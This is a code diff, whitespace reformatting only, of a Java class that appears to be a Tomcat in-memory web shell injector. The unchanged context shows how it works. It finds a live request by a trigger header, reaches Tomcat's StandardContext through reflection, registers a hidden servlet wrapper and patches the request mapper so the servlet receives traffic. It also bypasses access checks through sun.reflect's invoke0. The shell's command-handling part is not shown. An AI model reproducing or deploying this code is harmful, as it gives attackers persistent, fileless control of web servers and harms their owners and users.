@@ -42,7 +42,7 @@ public class TSMSFromRequest implements Servlet {
 
     public static void getRequestAndResponse() {
         try {
-            boolean  flag    = false;
+            boolean flag = false;
             Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
 
             for (int i = 0; i < threads.length; ++i) {
@@ -63,7 +63,7 @@ public class TSMSFromRequest implements Servlet {
                             for (int j = 0; j < processors.size(); ++j) {
                                 Object processor = processors.get(j);
                                 target = getFieldValue(processor, "req");
-                                Object req   = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
+                                Object req = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
                                 String value = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String(HEADER_KEY));
                                 if (value != null && value.contains(HEADER_VALUE)) {
                                     request = (HttpServletRequest) req;
@@ -112,15 +112,15 @@ public class TSMSFromRequest implements Servlet {
 
     public static void addServlet() {
         try {
-            ServletContext           servletContext           = request.getServletContext();
+            ServletContext servletContext = request.getServletContext();
             ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
-            Field                    applicationContextField  = applicationContextFacade.getClass().getDeclaredField("context");
+            Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
             applicationContextField.setAccessible(true);
-            ApplicationContext applicationContext   = (ApplicationContext) applicationContextField.get(applicationContextFacade);
-            Field              standardContextField = applicationContext.getClass().getDeclaredField("context");
+            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
+            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
             standardContextField.setAccessible(true);
             StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
-            Wrapper         wrapper         = standardContext.createWrapper();
+            Wrapper wrapper = standardContext.createWrapper();
             wrapper.setName(NAME);
             standardContext.addChild(wrapper);
 
@@ -148,33 +148,33 @@ public class TSMSFromRequest implements Servlet {
 
 
     public static void transform(Object standardContext, String path) throws Exception {
-        Object containerBase       = getMethodAndInvoke(standardContext, "getParent", null, null);
-        Class  mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
-        Field  listenersField      = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
+        Object containerBase = getMethodAndInvoke(standardContext, "getParent", null, null);
+        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
+        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
         listenersField.setAccessible(true);
         ArrayList listeners = (ArrayList) listenersField.get(containerBase);
 
         for (int i = 0; i < listeners.size(); ++i) {
             Object mapperListener_Mapper = listeners.get(i);
             if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
-                Object mapperListener_Mapper2      = getFieldValue(mapperListener_Mapper, "mapper");
+                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                 Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");
 
                 for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
-                    Object mapperListener_Mapper_host                       = Array.get(mapperListener_Mapper_hosts, j);
-                    Object mapperListener_Mapper_hosts_contextList          = getFieldValue(mapperListener_Mapper_host, "contextList");
+                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
+                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                     Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");
 
                     for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                         Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                         if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                             new ArrayList();
-                            Object standardContext_Mapper                                        = getMethodAndInvoke(standardContext, "getMapper", null, null);
-                            Object standardContext_Mapper_Context                                = getFieldValue(standardContext_Mapper, "context");
-                            Object standardContext_Mapper_Context_exactWrappers                  = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
+                            Object standardContext_Mapper = getMethodAndInvoke(standardContext, "getMapper", null, null);
+                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
+                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                             Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");
 
-                            int    l;
+                            int l;
                             Object Mapper_Wrapper;
                             Method addWrapperMethod;
                             for (l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
@@ -220,8 +220,8 @@ public class TSMSFromRequest implements Servlet {
             java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
             if (method != null) {
 
-                Class                    clazz = Class.forName("sun.reflect.NativeMethodAccessorImpl");
-                java.lang.reflect.Method m     = clazz.getDeclaredMethod("invoke0", new Class[]{java.lang.reflect.Method.class, Object.class, Object[].class});
+                Class clazz = Class.forName("sun.reflect.NativeMethodAccessorImpl");
+                java.lang.reflect.Method m = clazz.getDeclaredMethod("invoke0", new Class[]{java.lang.reflect.Method.class, Object.class, Object[].class});
                 m.setAccessible(true);
                 return m.invoke(null, new Object[]{method, obj, parameters});
             }
